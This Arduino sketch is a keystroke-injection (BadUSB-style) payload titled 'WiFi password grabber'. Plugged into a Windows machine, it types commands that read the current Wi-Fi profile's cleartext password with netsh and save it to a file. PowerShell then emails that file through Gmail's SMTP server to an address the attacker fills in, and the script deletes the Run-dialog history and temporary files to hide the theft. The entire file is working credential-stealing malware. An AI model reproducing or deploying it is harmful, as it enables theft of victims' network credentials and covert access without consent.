#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Title: WiFi password grabber
  // Author: TECHJUVI
  // Version: 5
  // Description: Saves the SSID, Network type, Authentication and the password to Profile.txt and emails the contents of Profile.txt from a gmail account.
  delay(3000);

  // --> Minimize all windows
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(1000);

  // --> Open cmd
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(1000);

  // --> Getting SSID
  Keyboard.print("cd \"%USERPROFILE%\\Desktop\" & for /f \"tokens=2 delims=: \" %A in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"BSSID\"') do set A=%A");

  typeKey(KEY_RETURN);

  // --> Creating A.txt
  Keyboard.print("netsh wlan show profiles %A% key=clear | findstr /c:\"Network type\" /c:\"Authentication\" /c:\"Key Content\" | findstr /v \"broadcast\" | findstr /v \"Radio\">>A.txt");

  typeKey(KEY_RETURN);

  // --> Get network type
  Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Network type\" A.txt') do set B=%A");

  typeKey(KEY_RETURN);

  // --> Get authentication
  Keyboard.print("for /f \"tokens=2 delims=: \" %A in ('findstr \"Authentication\" A.txt') do set C=%A");

  typeKey(KEY_RETURN);

  // --> Get password
  Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Key Content\" A.txt') do set D=%A");

  typeKey(KEY_RETURN);

  // --> Delete A.txt
  Keyboard.print("del A.txt");

  typeKey(KEY_RETURN);

  // --> Create Profile.txt
  Keyboard.print("echo SSID: %A%>>Profile.txt & echo Network type: %B%>>Profile.txt & echo Authentication: %C%>>Profile.txt & echo Password: %D%>>Profile.txt");

  typeKey(KEY_RETURN);

  // --> Mail Profile.txt
  Keyboard.print("powershell");

  typeKey(KEY_RETURN);

  Keyboard.print("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.EnableSsl = $true");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('CHANGE_THIS_GMAIL_ADDRESS@gmail.com', 'CHANGE_THIS_TO_GMAIL_PASSWORD')");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.From = 'CHANGE_TO_GMAIL_ADDRESS@gmail.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.To.Add('CHANGE_TO_Receivers_Email_ADDRESS')");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Subject = 'WiFi Password'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Body = (Get-Content Profile.txt | out-string)");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Send($ReportEmail)");

  typeKey(KEY_RETURN);

  Keyboard.print("del Profile.txt");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("clear");

  delay(1000);

  Keyboard.print("exit");

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
